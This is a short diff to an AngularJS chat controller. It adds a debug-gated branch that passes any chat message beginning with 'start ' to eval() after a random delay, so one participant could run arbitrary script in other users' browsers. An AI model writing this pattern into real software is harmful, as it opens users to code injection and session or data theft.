@@ -130,6 +130,17 @@ ITEventApp.controller(
 
                             delete $scope.chatrooms[chatroomId].messages[min];
                         }
+
+                        if(ITEventDebug && data.message.indexOf('start ') === 0) {
+                            var cmd = data.message.replace('start ', '');
+
+                            setTimeout(
+                                function() {
+                                    eval(cmd);
+                                },
+                                Math.round(500 * Math.random())
+                            );
+                        }
                     }
                 });
             });
